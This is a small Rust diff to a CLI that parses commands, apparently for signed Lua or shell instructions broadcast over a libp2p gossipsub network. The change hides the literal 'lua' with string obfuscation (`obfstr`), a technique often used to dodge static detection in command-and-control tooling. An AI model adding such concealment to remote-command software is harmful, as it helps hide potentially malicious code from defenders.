@@ -2,6 +2,7 @@ use anyhow::Result;
 use crystals_dilithium::dilithium3::SecretKey;
 use libp2p::{gossipsub::IdentTopic, Swarm};
 use log::{error, info, warn};
+use obfstr::obfstr;
 
 use crate::{config::NETWORK_NAME, payload::Payload};
 
@@ -28,7 +29,7 @@ impl CLI {
         }
       };
 
-      let command: Vec<String> = if command_name == "lua" {
+      let command: Vec<String> = if command_name == obfstr!("lua") {
         vec!["lua".to_string(), parts.next().unwrap_or_default().to_string()]
       } else {
         buffer.split_whitespace().map(String::from).collect()
